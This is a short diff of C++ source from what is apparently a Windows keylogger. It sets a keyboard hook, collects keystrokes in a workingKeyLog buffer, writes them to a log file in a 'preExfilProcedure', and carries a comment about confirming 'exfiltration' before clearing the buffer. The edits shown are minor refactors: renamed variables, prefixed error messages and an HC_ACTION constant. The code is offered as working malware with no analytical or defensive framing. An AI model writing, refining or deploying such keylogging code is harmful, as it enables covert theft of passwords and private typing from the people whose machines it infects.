@@ -18,20 +18,20 @@ namespace APIHook
 	{
 		if (workingKeyLog.empty())
 		{
-			Auxiliary::logError("preExfilProcedure() - Nothing was logged into the temp workingKeyLog!");
+			Auxiliary::logError("APIHook::preExfilProcedure() - Nothing was logged into the temp workingKeyLog!");
 			return;
 		}
 		
-		std::string updatedKeyLogFile = IO::writeToLog(workingKeyLog);
-		Auxiliary::logError("preExfilProcedure() - workingKeyLog has been pushed to key log file!");
+		std::string newLogFilePath = IO::writeToLog(workingKeyLog);
+		Auxiliary::logError("APIHook::preExfilProcedure() - workingKeyLog has been pushed to key log file!");
 		
-		if (updatedKeyLogFile.empty())
+		if (newLogFilePath.empty())
 		{
-			Auxiliary::logError("preExfilProcedure() - IO::writeToLog() had some issues creating the log file!");
+			Auxiliary::logError("APIHook::preExfilProcedure() - IO::writeToLog() had some issues creating the log file!");
 		}
 		else
 		{
-			Auxiliary::logError("preExfilProcedure() - A new key log file has been generated!");
+			Auxiliary::logError("APIHook::preExfilProcedure() - A new key log file has been generated!");
 		}
 
 		//Add if/else functionality here to check for successful exfiltration before clearing workingKeyLog
@@ -63,7 +63,7 @@ namespace APIHook
 
 	LRESULT hookingProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 	{
-		if (nCode < 0)
+		if (nCode < HC_ACTION)
 		{
 			CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 		}
